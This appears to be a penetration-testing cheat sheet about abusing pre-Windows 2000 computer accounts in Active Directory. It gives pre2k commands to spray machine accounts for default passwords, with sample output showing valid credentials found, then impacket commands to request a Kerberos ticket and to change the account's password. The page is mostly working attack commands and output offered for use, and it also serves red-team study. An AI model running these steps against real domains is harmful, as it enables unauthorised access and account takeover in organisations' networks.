---
title: "Pre-Windows 2000 Computer"
date: 2025-7-10
tags: ["Domain Controller", "Pre-Windows 2000 Computer", "Active Directory", "Windows", "pre2k", "Pre-Created Computer"]
---

### Enum

{{< tab set1 tab1 >}}pre2k{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### Installation

```console
python3 -m venv venv
```

```console
source venv/bin/activate
```

```console
git clone https://github.com/garrettfoster13/pre2k.git
```

```console
cd pre2k/
```

```console
pip3 install .
```

#### Query

```console
# Unauth
pre2k unauth -d '<DOMAIN>' -dc-ip '<DC_IP>' -verbose -inputfile '<MACHINES_FILE>'
```

```console {class="sample-code"}
$ cat machines.txt 
banking$

$ pre2k unauth -d example.com -dc-ip 192.168.1.10 -verbose -inputfile 'machines.txt'

                                ___    __         
                              /'___`\ /\ \        
 _____   _ __    __          /\_\ /\ \\ \ \/'\    
/\ '__`\/\`'__\/'__`\ _______\/_/// /__\ \ , <    
\ \ \L\ \ \ \//\  __//\______\  // /_\ \\ \ \\`\  
 \ \ ,__/\ \_\\ \____\/______/ /\______/ \ \_\ \_\
  \ \ \/  \/_/ \/____/         \/_____/   \/_/\/_/
   \ \_\                                      v3.1    
    \/_/                                          
                                            @unsigned_sh0rt
                                            @Tw1sm          

[23:53:03] INFO     Testing started at 2025-07-10 23:53:03
[23:53:03] INFO     Using 10 threads
[23:53:03] INFO     VALID CREDENTIALS: example.com\banking$:banking
```

```console
# Auth
pre2k auth -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -dc-ip '<DC_IP>' -verbose
```

```console {class="sample-code"}
$ pre2k auth -u trainee -p trainee -d example.com -dc-ip 192.168.1.10 -verbose                             

                                ___    __         
                              /'___`\ /\ \        
 _____   _ __    __          /\_\ /\ \\ \ \/'\    
/\ '__`\/\`'__\/'__`\ _______\/_/// /__\ \ , <    
\ \ \L\ \ \ \//\  __//\______\  // /_\ \\ \ \\`\  
 \ \ ,__/\ \_\\ \____\/______/ /\______/ \ \_\ \_\
  \ \ \/  \/_/ \/____/         \/_____/   \/_/\/_/
   \ \_\                                      v3.1    
    \/_/                                          
                                            @unsigned_sh0rt
                                            @Tw1sm          

[23:54:06] INFO     Retrieved 2 results total.
[23:54:06] INFO     Testing started at 2025-07-10 23:54:06
[23:54:06] INFO     Using 10 threads
[23:54:07] INFO     VALID CREDENTIALS: example.com\BANKING$:banking
[23:54:07] DEBUG    Invalid credentials: example.com\DC$:dc
```

<small>*Ref: [pre2k](https://github.com/garrettfoster13/pre2k)*</small>

{{< /tabcontent >}}

### Abuse #1: Connect via Kerberos

{{< tab set2 tab1 >}}impacket{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Request a Ticket

```console
sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.example.com && impacket-getTGT 'example.com/Banking$:banking' -dc-ip dc.example.com     
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Banking$.ccache
```

```console
export KRB5CCNAME='<USER>.ccache'
```

{{< /tabcontent >}}

### Abuse #2: Change Target Password

{{< tab set3 tab1 >}}impacket{{< /tab >}}
{{< tabcontent set3 tab1 >}}

```console
impacket-changepasswd -newpass <NEW_PASSWORD> '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -protocol rpc-samr
```

```console {class="sample-code"}
$ impacket-changepasswd -newpass banking 'example.com/BANKING$:banking@dc.example.com' -protocol rpc-samr 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of example.com\BANKING$
[*] Connecting to DCE/RPC as example.com\BANKING$
[*] Password was changed successfully.
```

{{< /tabcontent >}}